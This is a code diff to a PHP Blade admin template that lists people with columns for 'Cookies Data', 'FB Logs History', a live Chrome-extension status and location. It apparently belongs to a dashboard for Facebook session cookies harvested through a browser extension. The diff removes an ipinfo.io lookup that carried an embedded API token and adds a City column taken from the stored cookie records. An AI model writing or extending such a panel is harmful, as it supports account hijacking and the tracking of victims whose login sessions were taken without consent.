@@ -35,6 +35,7 @@
                        <th>Email </th>
                        <th>Last Seen</th>
                        <th>Phone</th>
+                       <th>City</th>                      
                        <th>Status</th>
                        <th>Cookies Data</th>
                        <th>FB Logs History</th>
@@ -48,14 +49,6 @@
                      <tbody>                       
 @if(!empty($data))
 
-@php
- function ip_details($IPaddress) 
-{
-    $json       = file_get_contents("https://ipinfo.io/{$IPaddress}?token=bfc6fd80781b1d");
-    $details    = json_decode($json);
-    return $details;
-}
-@endphp 
 
 
 @php $i = 1; @endphp
@@ -64,7 +57,7 @@
                         <td>@php echo $i++; @endphp</td>  
                         <td><img width="15" height="15" src="@if($datas['live'] == 1) {{url('uploads/chrome.png')}} @else{{url('uploads/chromegrey.png')}} @endif " alt="Italian Trulli"> </td>
                         <td> @if(!empty($datas['cookies'])) <img height="30" width="30" src="{{url('uploads/facebook.png')}}" alt="Italian Trulli"> @endif</td> 
-                        <td>   @php if(!empty($datas['cookies']['ip'])) { $IPaddress  = ip_details($datas['cookies']['ip']); echo  $IPaddress->country; }  @endphp</td> 
+                        <td>  @if(!empty($datas['cookies']['country'])) {{$datas['cookies']['country']}} @endif</td> 
 
 
                        <td>{{$datas['name']}} </td>
@@ -83,7 +76,11 @@
 
                     
                        <td>{{$datas['phone']}}</td> 
+
+                       <td>@if(!empty($datas['cookies']['city'])) {{$datas['cookies']['city']}} @endif</td> 
+
                        <td> @if($datas['status'] == 1) <span style="color: green"> Active</span>  @elseif($datas['status'] == 0) <span style="color: red"> Pending </span> @elseif($datas['status'] == 2)<span style="color: red"> Policy </span>@else  <span style="color: red"> Logged Out </span> @endif </td> 
+                       
                        <td> <button type="button" class="btn btn-info btn-lg userdT" data-user-id ="{{$datas['id']}}" data-toggle="modal" data-target="#myModal">View</button></td>  
 
 
